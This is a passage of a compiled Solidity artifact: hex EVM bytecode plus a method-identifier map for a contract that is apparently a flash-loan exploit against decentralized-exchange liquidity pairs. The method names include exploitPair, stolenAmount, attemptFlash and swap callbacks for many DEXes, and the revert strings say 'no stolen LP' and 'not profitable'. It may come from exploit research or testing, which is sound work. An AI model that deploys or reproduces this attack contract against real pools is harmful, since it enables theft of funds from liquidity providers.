af565b9050919050565b5f6020828403121561340457613403612ee5565b5b5f61341184828501612f36565b91505092915050565b7f756e6578706563746564207061796c6f616400000000000000000000000000005f82015250565b5f61344e601283613118565b91506134598261341a565b602082019050919050565b5f6020820190508181035f83015261347b81613442565b9050919050565b5f8151905061349081612f20565b92915050565b5f602082840312156134ab576134aa612ee5565b5b5f6134b884828501613482565b91505092915050565b7f696e73756666696369656e74206d696e746564204c50000000000000000000005f82015250565b5f6134f5601683613118565b9150613500826134c1565b602082019050919050565b5f6020820190508181035f830152613522816134e9565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61356082612f17565b915061356b83612f17565b925082820390508181111561358357613582613529565b5b92915050565b7f6e6f2073746f6c656e204c5000000000000000000000000000000000000000005f82015250565b5f6135bd600c83613118565b91506135c882613589565b602082019050919050565b5f6020820190508181035f8301526135ea816135b1565b9050919050565b5f6135fb82612f17565b915061360683612f17565b925082820261361481612f17565b9150828204841483151761362b5761362a613529565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61366982612f17565b915061367483612f17565b92508261368457613683613632565b5b828204905092915050565b5f61369982612f17565b91506136a483612f17565b92508282019050808211156136bc576136bb613529565b5b92915050565b7f7a65726f2070726f6669740000000000000000000000000000000000000000005f82015250565b5f6136f6600b83613118565b9150613701826136c2565b602082019050919050565b5f6020820190508181035f830152613723816136ea565b9050919050565b5f81905092915050565b5f61373e826131fd565b613748818561372a565b9350613758818560208601613217565b80840191505092915050565b5f61376f8284613734565b915081905092915050565b5f61378482612e84565b9050919050565b6137948161377a565b811461379e575f5ffd5b50565b5f815190506137af8161378b565b92915050565b5f602082840312156137ca576137c9612ee5565b5b5f6137d7848285016137a1565b91505092915050565b5f6dffffffffffffffffffffffffffff82169050919050565b613802816137e0565b811461380c575f5ffd5b50565b5f8151905061381d816137f9565b92915050565b5f63ffffffff82169050919050565b61383b81613823565b8114613845575f5ffd5b50565b5f8151905061385681613832565b92915050565b5f5f5f6060848603121561387357613872612ee5565b5b5f6138808682870161380f565b93505060206138918682870161380f565b92505060406138a286828701613848565b9150509250925092565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b6138e281612ea3565b82525050565b6138f181612f17565b82525050565b61010082015f82015161390c5f8501826138d9565b50602082015161391f60208501826138d9565b50604082015161393260408501826138d9565b50606082015161394560608501826138e8565b50608082015161395860808501826138e8565b5060a082015161396b60a08501826138e8565b5060c082015161397e60c08501826138e8565b5060e082015161399160e08501826138e8565b50505050565b5f610100820190506139ab5f8301846138f7565b92915050565b6139ba8161302f565b81146139c4575f5ffd5b50565b5f815190506139d5816139b1565b92915050565b5f602082840312156139f0576139ef612ee5565b5b5f6139fd848285016139c7565b91505092915050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f81519050919050565b5f82825260208201905092915050565b5f613aa582613a81565b613aaf8185613a8b565b9350613abf818560208601613217565b613ac881613225565b840191505092915050565b5f60c083015f8301518482035f860152613aed8282613a9b565b9150506020830151613b0260208601826138d9565b506040830151613b1560408601826138d9565b506060830151613b2860608601826138e8565b506080830151613b3b60808601826138e8565b5060a0830151613b4e60a08601826138e8565b508091505092915050565b5f613b648383613ad3565b905092915050565b5f602082019050919050565b5f613b8282613a58565b613b8c8185613a62565b935083602082028501613b9e85613a72565b805f5b85811015613bd95784840389528151613bba8582613b59565b9450613bc583613b6c565b925060208a01995050600181019050613ba1565b50829750879550505050505092915050565b5f602083015f8301518482035f860152613c058282613b78565b9150508091505092915050565b5f613c1d8383613beb565b905092915050565b5f602082019050919050565b5f613c3b82613a2f565b613c458185613a39565b935083602082028501613c5785613a49565b805f5b85811015613c925784840389528151613c738582613c12565b9450613c7e83613c25565b925060208a01995050600181019050613c5a565b50829750879550505050505092915050565b5f602083015f8301518482035f860152613cbe8282613c31565b9150508091505092915050565b5f613cd68383613ca4565b905092915050565b5f602082019050919050565b5f613cf482613a06565b613cfe8185613a10565b935083602082028501613d1085613a20565b805f5b85811015613d4b5784840389528151613d2c8582613ccb565b9450613d3783613cde565b925060208a01995050600181019050613d13565b50829750879550505050505092915050565b5f602083015f8301518482035f860152613d778282613cea565b9150508091505092915050565b5f60039050919050565b5f81905092915050565b5f819050919050565b5f613dac83836138e8565b60208301905092915050565b5f602082019050919050565b613dcd81613d84565b613dd78184613d8e565b9250613de282613d98565b805f5b83811015613e12578151613df98782613da1565b9650613e0483613db8565b925050600181019050613de5565b505050505050565b5f61014082019050613e2e5f83018b612eb4565b613e3b602083018a612eb4565b613e486040830189612eb4565b8181036060830152613e5a8188613d5d565b9050613e696080830187612eb4565b613e7660a0830186612eb4565b613e8360c0830185613dc4565b613e916101208301846131ee565b9998505050505050505050565b5f61016082019050613eb25f83018c612eb4565b613ebf602083018b612eb4565b613ecc604083018a612eb4565b613ed96060830189613062565b613ee66080830188612eb4565b613ef360a08301876131ee565b613f0060c0830186612eb4565b81810360e0830152613f128185613d5d565b9050613f22610100830184613dc4565b9a9950505050505050505050565b7f6e6f742070726f66697461626c650000000000000000000000000000000000005f82015250565b5f613f64600e83613118565b9150613f6f82613f30565b602082019050919050565b5f6020820190508181035f830152613f9181613f58565b9050919050565b5f60e082019050613fab5f83018a612eb4565b613fb86020830189612eb4565b613fc56040830188613062565b613fd260608301876131ee565b613fdf60808301866131ee565b613fec60a0830185612eb4565b613ff960c0830184613062565b98975050505050505050565b5f5f6040838503121561401b5761401a612ee5565b5b5f61402885828601613482565b925050602061403985828601613482565b9150509250929050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f6140a483836138d9565b60208301905092915050565b5f602082019050919050565b5f6140c682614070565b6140d0818561407a565b93506140db8361408a565b805f5b8381101561410b5781516140f28882614099565b97506140fd836140b0565b9250506001810190506140de565b5085935050505092915050565b5f60a08201905061412b5f830188613062565b61413860208301876131ee565b818103604083015261414a81866140bc565b90506141596060830185612eb4565b6141666080830184613062565b9695505050505050565b61417982613225565b810181811067ffffffffffffffff8211171561419857614197614043565b5b80604052505050565b5f6141aa612edc565b90506141b68282614170565b919050565b5f67ffffffffffffffff8211156141d5576141d4614043565b5b602082029050602081019050919050565b5f6141f86141f3846141bb565b6141a1565b9050808382526020820190506020840283018581111561421b5761421a612f52565b5b835b8181101561424457806142308882613482565b84526020840193505060208101905061421d565b5050509392505050565b5f82601f83011261426257614261612f4a565b5b81516142728482602086016141e6565b91505092915050565b5f602082840312156142905761428f612ee5565b5b5f82015167ffffffffffffffff8111156142ad576142ac612ee9565b5b6142b98482850161424e565b91505092915050565b7f72657061796d656e742073686f727466616c6c000000000000000000000000005f82015250565b5f6142f6601383613118565b9150614301826142c2565b602082019050919050565b5f6020820190508181035f830152614323816142ea565b9050919050565b5f60408201905061433d5f830185612eb4565b61434a6020830184613062565b9392505050565b5f6040820190506143645f830185612eb4565b6143716020830184612eb4565b9392505050565b5f60ff82169050919050565b5f61439e614399614394846131bb565b6131c4565b614378565b9050919050565b6143ae81614384565b82525050565b5f6040820190506143c75f830185612eb4565b6143d460208301846143a5565b9392505050565b7f746f6b656e2063616c6c206661696c65640000000000000000000000000000005f82015250565b5f61440f601183613118565b915061441a826143db565b602082019050919050565b5f6020820190508181035f83015261443c81614403565b9050919050565b7f746f6b656e206f702072657475726e65642066616c73650000000000000000005f82015250565b5f614477601783613118565b915061448282614443565b602082019050919050565b5f6020820190508181035f8301526144a48161446b565b905091905056fea2646970667358221220fecdee2cd1f9c5e04a3985fa215d0d193157d47e6475d6a649400254a52b5e8464736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","attemptFlash((address,address,address,uint256,uint256,uint256,uint256,uint256))":"da0d9389","biswapCall(address,uint256,uint256,bytes)":"45677bc7","croDefiSwapCall(address,uint256,uint256,bytes)":"6c813d29","executeOnOpportunity()":"3c2448ed","executed()":"31a38c89","exploitPair()":"0ec80b23","exploitToken0()":"edf857d1","exploitToken1()":"139752c7","hypothesisValidated()":"463defd1","joeCall(address,uint256,uint256,bytes)":"ee22dd87","liquidXCall(address,uint256,uint256,bytes)":"4904b43f","liquidXv2Call(address,uint256,uint256,bytes)":"c41cfb4b","liquidxCall(address,uint256,uint256,bytes)":"6488f370","liquidxV2Call(address,uint256,uint256,bytes)":"99967255","mDexCall(address,uint256,uint256,bytes)":"1d0032d3","pancakeCall(address,uint256,uint256,bytes)":"84800812","profitAmount()":"5ff972cc","profitToken()":"49343624","seedCapitalUsed()":"56d7b8cf","smardexCall(address,uint256,uint256,bytes)":"c26558b0","stolenAmount()":"a533d40e","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}